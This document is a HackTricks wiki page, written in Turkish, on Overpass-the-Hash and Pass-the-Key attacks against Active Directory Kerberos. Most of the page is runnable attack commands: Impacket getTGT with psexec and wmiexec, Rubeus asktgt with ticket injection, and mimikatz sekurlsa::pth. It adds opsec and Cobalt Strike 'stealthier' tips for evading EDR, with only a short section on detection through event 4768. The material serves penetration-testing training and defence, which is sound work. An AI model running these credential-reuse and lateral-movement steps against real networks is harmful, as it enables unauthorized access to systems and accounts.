# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** saldırısı, geleneksel NTLM protocol'ünün kısıtlandığı ve Kerberos authentication'ın öncelik kazandığı ortamlar için tasarlanmıştır. Bu saldırı, bir kullanıcının NTLM hash veya AES keys'lerini kullanarak Kerberos tickets talep etmeyi sağlar ve network içindeki resources'a yetkisiz erişim mümkün kılar.

Kesin olarak:

- **Over-Pass-the-Hash** genellikle **NT hash**'ini **RC4-HMAC** Kerberos key üzerinden bir Kerberos TGT'ye dönüştürmek anlamına gelir.
- **Pass-the-Key** ise daha genel versiyondur; burada zaten **AES128/AES256** gibi bir Kerberos key'iniz vardır ve onunla doğrudan bir TGT istersiniz.

Bu fark, hardened ortamlar için önemlidir: eğer **RC4 disabled** ise veya KDC tarafından artık varsayılmıyorsa, yalnızca **NT hash** yeterli değildir ve bir **AES key**'e (veya onu türetmek için cleartext password'e) ihtiyaç duyarsınız.

Bu saldırıyı gerçekleştirmek için ilk adım, hedeflenen kullanıcının hesabının NTLM hash veya password'ünü elde etmektir. Bu bilgi güvence altına alındıktan sonra, hesap için bir Ticket Granting Ticket (TGT) alınabilir; bu da saldırganın kullanıcının yetkili olduğu services veya machines'e erişmesini sağlar.

İşlem aşağıdaki commands ile başlatılabilir:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256 gerektiren senaryolar için, `-aesKey [AES key]` seçeneği kullanılabilir:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` ayrıca `-service <SPN>` ile **doğrudan bir AS-REQ üzerinden service ticket istemeyi** destekler; bu, ekstra bir TGS-REQ olmadan belirli bir SPN için ticket istediğinizde faydalı olabilir:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Ayrıca, elde edilen bilet çeşitli araçlarla, `smbexec.py` veya `wmiexec.py` dahil, kullanılabilir ve saldırının kapsamını genişletir.

_PyAsn1Error_ veya _KDC cannot find the name_ gibi karşılaşılan sorunlar genellikle Impacket kütüphanesini güncelleyerek veya IP adresi yerine hostname kullanarak çözülür; böylece Kerberos KDC ile uyumluluk sağlanır.

Rubeus.exe kullanan alternatif bir komut dizisi, bu tekniğin başka bir yönünü gösterir:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Bu yöntem, **Pass the Key** yaklaşımını yansıtır; odak noktası, ticket'ı doğrudan authentication amaçları için ele geçirip kullanmaktır. Pratikte:

- `Rubeus asktgt` **raw Kerberos AS-REQ/AS-REP**'yi doğrudan gönderir ve `/luid` ile başka bir logon session'ı hedeflemek veya `/createnetonly` ile ayrı bir tane oluşturmak istemediğiniz sürece **admin rights** gerektirmez.
- `mimikatz sekurlsa::pth` credential material'ı bir logon session'a patch eder ve bu nedenle **LSASS'a dokunur**; bu genellikle local admin veya `SYSTEM` gerektirir ve EDR açısından daha gürültülüdür.

Mimikatz ile örnekler:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Operasyonel güvenliğe uymak ve AES256 kullanmak için aşağıdaki komut uygulanabilir:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` önemlidir çünkü Rubeus tarafından üretilen trafik, native Windows Kerberos’tan biraz farklıdır. Ayrıca `/opsec`’in **AES256** trafiği için tasarlandığını unutmayın; bunu RC4 ile kullanmak genellikle `/force` gerektirir ve bu da amacın büyük kısmını boşa çıkarır çünkü **modern domainlerde RC4 zaten güçlü bir sinyaldir**.

## Detection notes

Her TGT isteği DC üzerinde **event `4768`** oluşturur. Mevcut Windows build’lerinde bu event, eski yazılarda belirtilenden daha faydalı alanlar içerir:

- `TicketEncryptionType`, verilen TGT için hangi enctype’ın kullanıldığını söyler. Tipik değerler **RC4-HMAC** için `0x17`, **AES128** için `0x11` ve **AES256** için `0x12`’dir.
- Güncellenmiş event’ler ayrıca `SessionKeyEncryptionType`, `PreAuthEncryptionType` ve client’ın reklam ettiği enctypes alanlarını da açığa çıkarır; bu da **gerçek RC4 bağımlılığını** kafa karıştırıcı legacy default’lardan ayırmaya yardımcı olur.
- Modern bir environment’ta `0x17` görmek, account, host veya KDC fallback path’in hâlâ RC4’ye izin verdiğine dair iyi bir ipucudur; bu da onu NT-hash tabanlı Over-Pass-the-Hash için daha elverişli hâle getirir.

Microsoft, Kasım 2022 Kerberos hardening güncellemelerinden beri RC4-by-default davranışını kademeli olarak azaltıyor ve mevcut yayımlanan guidance, **2026 Q2 sonuna kadar AD DC’ler için default varsayılan enctype olarak RC4’nin kaldırılması** yönünde. Offensive açıdan bu, **AES ile Pass-the-Key**’in giderek daha güvenilir yol olduğu, klasik **sadece NT-hash kullanan OpTH**’nin ise hardened ortamларда daha sık başarısız olacağı anlamına gelir.

Kerberos encryption types ve ilgili ticketing behaviour hakkında daha fazla detay için şuraya bakın:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Her logon session aynı anda yalnızca bir aktif TGT’ye sahip olabilir, bu yüzden dikkatli olun.

1. Cobalt Strike ile **`make_token`** kullanarak yeni bir logon session oluşturun.
2. Ardından, mevcut olanı etkilemeden yeni logon session için bir TGT üretmek üzere Rubeus kullanın.

Rubeus’un kendisinden de, kurban olarak kullanılacak bir **logon type 9** session ile benzer bir isolation elde edebilirsiniz:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Bu, mevcut oturum TGT’sinin üzerine yazılmasını önler ve genellikle bileti mevcut logon oturumunuza import etmekten daha güvenlidir.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
